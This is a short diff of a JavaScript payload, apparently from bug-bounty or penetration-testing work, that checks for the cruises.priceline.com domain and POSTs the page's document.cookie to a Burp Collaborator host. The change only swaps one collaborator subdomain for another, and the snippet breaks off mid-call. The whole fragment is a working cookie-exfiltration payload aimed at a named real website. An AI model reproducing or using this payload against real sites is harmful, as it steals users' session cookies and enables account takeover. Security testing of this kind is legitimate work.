@@ -1,5 +1,5 @@
 if (document.domain == "cruises.priceline.com") {
-  fetch('https://b3fmyvfwxiql3n1q7dvowbr9q0wqkf.burpcollaborator.net', {
+  fetch('https://ipbnmjhy301o0o6y530vo4h2vt1jp8.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
